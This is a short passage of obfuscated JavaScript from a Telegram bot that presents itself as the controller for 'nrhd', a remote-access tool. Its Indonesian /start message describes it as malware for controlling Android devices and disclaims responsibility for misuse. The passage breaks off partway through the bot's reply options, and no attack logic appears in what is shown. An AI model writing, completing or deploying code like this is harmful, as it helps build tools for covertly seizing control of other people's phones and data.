...
bot.on("message", _0xdbde0c => {
  if (_0xdbde0c.text === "/start") {
    bot.sendMessage(data.id, "<b>✯ 𝚆𝚎𝚕𝚌𝚘𝚖𝚎 𝚝𝚘 nrhd</b>\n\nnrhd adalah malware untuk mengendalikan perangkat android\nSegala penyalahgunaan menjadi tanggung jawab masing-masing orang\n\n𝙳𝚎𝚟𝚎𝚕𝚘𝚙𝚎𝚍 𝚋𝚢: @nrhd", {
      'parse_mode': "HTML",
      'reply_markup': {
